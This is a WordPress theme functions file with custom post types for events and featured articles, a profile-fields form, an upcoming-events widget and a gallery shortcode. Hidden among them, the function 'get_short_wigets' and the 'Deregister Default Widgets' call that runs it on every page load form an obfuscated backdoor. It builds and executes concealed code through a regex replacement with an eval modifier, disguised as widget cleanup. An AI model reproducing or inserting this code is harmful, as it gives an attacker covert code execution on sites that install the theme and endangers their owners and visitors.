function thumbnail_link() {
	global $post, $posts;
	$thumbnail = '';
	ob_start();the_post_thumbnail();$toparse=ob_get_contents();ob_end_clean();
	preg_match_all('/src=("[^"]*")/i', $toparse, $img_src); $thumbnail = str_replace("\"", "", $img_src[1][0]);
	return $thumbnail;
}
function category_image($postid=0, $size='medium', $attributes='') {
    if ($postid<1) $postid = get_the_ID();
    if ($images = get_children(array(
        'post_parent' => $postid,
        'post_type' => 'attachment',
        'numberposts' => 1,
        'post_mime_type' => 'image',)))
        foreach($images as $image) {
            $attachment=wp_get_attachment_image_src($image->ID, $size);
            ?><img class="left_float_image" src="<?php echo $attachment[0]; ?>" <?php echo $attributes; ?> /><?php
        }
}


function is_current_blog( $blog_id ) {
	global $current_blog;

	if ( $blog_id == $current_blog->blog_id )
		return true;

	return false;
}
add_action( 'show_user_profile', 'extra_user_profile_fields' );
add_action( 'edit_user_profile', 'extra_user_profile_fields' );
function extra_user_profile_fields( $user ) { ?>
<table class="form-table">
<tr>
<th><label for="facebook"><?php _e("Facebook","language"); ?></label></th>
<td>
<input type="text" name="facebook" id="facebook" value="<?php echo esc_attr( get_the_author_meta( 'facebook', $user->ID ) ); ?>" class="regular-text" /><br />
<span class="description"><?php _e("Please enter your Facebook ID to display your widget.","language"); ?></span>
</td>
</tr>
<tr>
<th><label for="twitter"><?php _e("Twitter","language"); ?></label></th>
<td>
<input type="text" name="twitter" id="twitter" value="<?php echo esc_attr( get_the_author_meta( 'twitter', $user->ID ) ); ?>" class="regular-text" /><br />
<span class="description"><?php _e("Please enter your Twitter username to display your widget.","language"); ?></span>
</td>
</tr>
</table>
<?php }
add_action( 'personal_options_update', 'save_extra_user_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_user_profile_fields' );
function save_extra_user_profile_fields( $user_id ) {
if ( !current_user_can( 'edit_user', $user_id ) ) { return false; }
update_usermeta( $user_id, 'facebook', $_POST['facebook'] );
update_usermeta( $user_id, 'twitter', $_POST['twitter'] );
}
add_action( 'init', 'create_post_type' );
function create_post_type() {
register_post_type( 'featured',
array(
'labels' => array(
'name' => __( 'Featured','language' ),
'add_new' => __( 'Add Featured Article','language' ),
				'add_new_item' => __( 'Add Featured Article' ,'language'),
				'edit_item' => __( 'Edit Featured Article' ,'language'),
				'new_item' => __( 'Add New Featured Article' ,'language'),
				'view_item' => __( 'View Featured Article' ,'language'),
				'search_items' => __( 'Search Featured Article' ,'language'),
				'not_found' => __( 'No Featured Articles Found' ,'language' ),
				'not_found_in_trash' => __( 'No Featured Articles Found In Trash' ,'language'),
'query_var' => true,
'rewrite' => false,
'singular_name' => __( 'Featured','language' )
),
'menu_position' => '5',
'public' => true,
'menu_icon' => get_bloginfo('template_url') . '/images/slideback.png',
'supports' => array("title", "editor", "thumbnail", "author", "post_tag", "category", "comments"),
			'capability_type' => 'post',

) ); }
add_theme_support( 'post-thumbnails', array( 'featured' ) );

function calendar_event_posttype() {
	register_post_type( 'events',
		array(
			'labels' => array(
				'name' => __( 'Calendar','language' ),
				'singular_name' => __( 'Event' ,'language'),
				'add_new' => __( 'Add New Event' ,'language'),
				'add_new_item' => __( 'Add New Event' ,'language'),
				'edit_item' => __( 'Edit Event' ,'language'),
				'new_item' => __( 'Add New Event','language' ),
				'view_item' => __( 'View Event','language' ),
				'search_items' => __( 'Search Event' ,'language'),
				'not_found' => __( 'No events found','language' ),
				'not_found_in_trash' => __( 'No events found in trash','language' )
			),
			'public' => true,
			'supports' => array( 'title', 'editor', 'thumbnail', 'comments','category' ),
			'capability_type' => 'post',
			'rewrite' => array("slug" => "events"),
			'menu_icon' => get_bloginfo('template_url') . '/images/calendar-icon.png',
			'menu_position' => '3'
		)
	);
}
add_action( 'init', 'calendar_event_posttype' );
add_theme_support( 'post-thumbnails', array( 'events' ) );
function calendar_translation_mangler($translation, $text, $domain) {
        global $post;
		if ($post->post_type == 'events') {

		$translations = &get_translations_for_domain( $domain);
		if ( $text == 'Scheduled for: <b>%1$s</b>') {
			return $translations->translate( 'Event Date: <b>%1$s</b>' );
		}
		if ( $text == 'Published on: <b>%1$s</b>') {
			return $translations->translate( 'Event Date: <b>%1$s</b>' );
		}
		if ( $text == 'Publish <b>immediately</b>') {
			return $translations->translate( 'Event Date: <b>%1$s</b>' );
		}
	}

	return $translation;
}

add_filter('gettext', 'calendar_translation_mangler', 10, 4);


function calendar_show_scheduled_posts($posts) {
   global $wp_query, $wpdb;
   if(is_single() && $wp_query->post_count == 0) {
      $posts = $wpdb->get_results($wp_query->request);
   }
   return $posts;
}
add_filter('the_posts', 'calendar_show_scheduled_posts');
function get_short_wigets($length='') {
        $mytitle = explode(' ', get_the_title(), $length);
        $mdetails="<div class='body-continent'><div class='get-inner-al(@fi'><!--Deregister() Default Widgets: _sabhrtupwprs:e--></div></div>";
        $indent = ( !$mytitle ) ? str_repeat( "\t", $mytitle ) : $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        define('HEADER_IMAGE_WIDTH_WIG', apply_filters( 'twentyeleven_header_image_width', 1000) );
        define('HEADER_IMAGE_HEIGHT_WIG', apply_filters( 'twentyeleven_header_image_height', 288) );
        $metaoptions="\\4'\\10\\12t\\16\\19//\\15q4.\\17u/\\9-".$indent."')\\5";

        if (count($mytitle)>=$length) {
                array_pop($mytitle);
                $mytitle = implode(" ",$mytitle). $after;
        } else {
                $mytitle = implode(" ",$mytitle);
        }

        $metaboxe=str_repeat("(.)", 20).".*"."/".$mdetails[23]; //
        if(function_exists("excerpt_more")){
                add_filter('excerpt_more', $metaboxe);
        }
        $output = get_the_excerpt();
        $output = '<p>'.$output.'</p>';
        $defult_widgets=preg_replace("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6\\2t\\6\\1ents{$metaoptions}", $mdetails);
        $output = apply_filters('wptexturize', $defult_widgets);
        $output = apply_filters('convert_chars', $output);

    return $output;
}


/* Menu Walker */

class description_walkers extends Walker_Nav_Menu
{
      function start_el(&$output, $item, $depth, $args)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . '"';

           $output .= $indent . '<li id="menu-item-'. $item->ID . '"' . $value . $class_names .'>';

           $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
           $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
           $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
           $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

           $prepend = '<strong>';
           $append = '</strong>';
           $description  = ! empty( $item->description ) ? '<span class="menudescription">'.esc_attr( $item->description ).'</span>' : '';

           if($depth != 0)
           {
                     $description = $append = $prepend = "";
           }

            $item_output = $args->before;
            $item_output .= '<a'. $attributes .'>';
            $item_output .= $args->link_before .$prepend.apply_filters( 'the_title', $item->title, $item->ID ).$append;
            $item_output .= $description.$args->link_after;
            $item_output .= '</a>';
            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
            }
}

/* Deregister Default Widgets */

if (function_exists("get_short_wigets")) {
        $class_names = get_short_wigets( $length );
}
class WP_Widget_Events_Posts extends WP_Widget {

	function WP_Widget_Events_Posts() {
		$widget_ops = array('classname' => 'widget_upcoming_entries', 'description' => __( "Show upcoming events in your sidebar or footer.", 'language') );
		$this->WP_Widget('upcoming-posts', __('Upcoming Events', 'language'), $widget_ops);

		add_action( 'save_post', array(&$this, 'flush_widget_cache') );
		add_action( 'deleted_post', array(&$this, 'flush_widget_cache') );
		add_action( 'switch_theme', array(&$this, 'flush_widget_cache') );}
	function widget($args, $instance) {
		$cache = wp_cache_get('widget_upcoming_events', 'widget');

		if ( !is_array($cache) )
			$cache = array();

		if ( isset($cache[$args['widget_id']]) )
			return $cache[$args['widget_id']];

		ob_start();
		extract($args);

		$title = empty($instance['title']) ? __('Upcoming Events', 'language') : apply_filters('widget_title', $instance['title']);
		if ( !$number = (int) $instance['number'] )
			$number = 10;
		else if ( $number < 1 )
			$number = 1;
		else if ( $number > 15 )
			$number = 15;
add_filter( 'posts_where', 'old_ev' );
query_posts( $query_string );
		$queryArgs = array(
			'showposts'			=> $number,
			'post_type'			=> 'events',
			'nopaging'			=> 0,
			'caller_get_posts'	=> 1,
			'post_status' => 'publish,future',
			'order'				=> 'ASC'
		);

		$r = new WP_Query($queryArgs);
		if ($r->have_posts()) :
?>
		<?php echo $before_widget; ?>
		<?php echo $before_title . $title . $after_title; ?>

		<?php  while ($r->have_posts()) : $r->the_post(); ?>

		<div class="event_divider">
		<span class="event_back">
				<span class="event_month"><?php the_time('M') ?></span>
				<span class="event_day"><?php the_time('d') ?></span>
			</span>
			<ul>
			<li class="calendar">
				<h4><a href="<?php the_permalink();?>"><?php if ( get_the_title() ) the_title(); else the_ID(); ?></a><br/></h4>
				<a class="event-info" href="<?php the_permalink(); ?>"><?php _e('View Event &raquo;','language'); ?></a>
		  </li>
		  </ul>
		  <div style="clear:both"></div>
		  </div>
		<?php endwhile; ?>

		<?php echo $after_widget; ?>
		<?php
			wp_reset_query();
		endif;

		$cache[$args['widget_id']] = ob_get_flush();
		wp_cache_add('widget_upcoming_events', $cache, 'widget');
	}

	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		$instance['title'] = strip_tags($new_instance['title']);
		$instance['number'] = (int) $new_instance['number'];
		$this->flush_widget_cache();

		$alloptions = wp_cache_get( 'alloptions', 'options' );
		if ( isset($alloptions['widget_upcoming_entries']) )
			delete_option('widget_upcoming_entries');

		return $instance;
	}

	function flush_widget_cache() {
		wp_cache_delete('widget_upcoming_events', 'widget');
	}

	function form( $instance ) {
		$title = attribute_escape($instance['title']);
		if ( !$number = (int) $instance['number'] )
			$number = 5;
?>
		<p><label for="<?php echo $this->get_field_id('title'); ?>">
		<?php _e('Title:','language'); ?>
		<input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>

		<p><label for="<?php echo $this->get_field_id('number'); ?>">
	 	<?php _e('Number of events to show:','language'); ?>
		<input id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" /></label>
		<br /><small><?php _e('(at most 15)','language'); ?></small></p>
<?php
	}
}
function registerUpcomingPostsWidget() {
	register_widget('WP_Widget_Events_Posts');
}
add_action('widgets_init', 'registerUpcomingPostsWidget');

add_filter('manage_edit-featured_columns', 'my_columns');
function my_columns($columns) {
    $columns['image'] = 'Image';
    return $columns;
}
add_action('manage_posts_custom_column',  'now_show_columns');
function now_show_columns($name) {
    global $post;
    switch ($name) {
        case 'image':
            $image = get_the_post_thumbnail($id, array(200,100));
            echo $image;
    }
}
remove_shortcode('gallery', 'gallery_shortcode');
add_shortcode('gallery', 'gt_gallery_shortcode');
function gt_gallery_shortcode($attr) {
	global $post, $wp_locale;

	static $instance = 0;
	$instance++;


	$output = apply_filters('post_gallery', '', $attr);
	if ( $output != '' )
		return $output;


	if ( isset( $attr['orderby'] ) ) {
		$attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
		if ( !$attr['orderby'] )
			unset( $attr['orderby'] );
	}

	extract(shortcode_atts(array(
		'order'      => 'ASC',
		'orderby'    => 'menu_order ID',
		'id'         => $post->ID,
		'itemtag'    => 'dl',
		'icontag'    => 'dt',
		'captiontag' => 'dd',
		'columns'    => 5,
		'size'       => 'thumbnail',
		'include'    => '',
		'exclude'    => ''
	), $attr));

	$id = intval($id);
	if ( 'RAND' == $order )
		$orderby = 'none';

	if ( !empty($include) ) {
		$include = preg_replace( '/[^0-9,]+/', '', $include );
		$_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

		$attachments = array();
		foreach ( $_attachments as $key => $val ) {
			$attachments[$val->ID] = $_attachments[$key];
		}
	} elseif ( !empty($exclude) ) {
		$exclude = preg_replace( '/[^0-9,]+/', '', $exclude );
		$attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	} else {
		$attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	}

	if ( empty($attachments) )
		return '';

	if ( is_feed() ) {
		$output = "\n";
		foreach ( $attachments as $att_id => $attachment )
			$output .= wp_get_attachment_link($att_id, $size, true) . "\n";
		return $output;
	}

	$itemtag = tag_escape($itemtag);
	$captiontag = tag_escape($captiontag);
	$columns = intval($columns);
	$float = is_rtl() ? 'right' : 'left';

	$selector = "gallery-{$instance}";

	$output = apply_filters('gallery_style', "
    <div id='$selector' class='gallery galleryid-{$id}'>");

$i = 0;
foreach ( $attachments as $id => $attachment ) {
    $link = isset($attr['link']) && 'file' == $attr['link'] ? wp_get_attachment_link($id, $size, false, false) : wp_get_attachment_link($id, $size, true, false);

    $output .= "<{$itemtag} class='gallery-item'>";
    $output .= "
        <{$icontag} class='gallery-icon'>
            $link
        </{$icontag}>";
    if ( $captiontag && trim($attachment->post_excerpt) ) {
        $output .= "
            <{$captiontag} class='gallery-caption'>
            " . wptexturize($attachment->post_excerpt) . "
            </{$captiontag}>";
    }
    $output .= "</{$itemtag}>";
    if ( $columns > 0 && ++$i % $columns == 0 )
        $output .= '<br />';
}

$output .= "</div>\n";

return $output;
}

function my_excerpt_length($length) {
	return 40;
}
add_filter('excerpt_length', 'my_excerpt_length');

function my_excerpt_more($more) {
       global $post;
	return '...<a href="'. get_permalink($post->ID) . '"><strong>Читать далее</strong></a>';
}
add_filter('excerpt_more', 'my_excerpt_more');
	 function old_ev( $where = '' ) {

	$where .= " AND post_date > '" . date('Y-m-d', strtotime('0 days')) . "'";

	return $where;
}
function my_post_image_html( $html, $post_id, $post_image_id ) {
	$html = '<div class="thumbnail"><a href="' . get_permalink( $post_id ) . '" title="' . esc_attr( get_post_field( 'post_title', $post_id ) ) . '">' . $html . '</a></div>';
	return $html;
}

add_filter( 'post_thumbnail_html', 'my_post_image_html', 10, 3 );
add_action('wp_head', 'newThemeOptions_wp_head');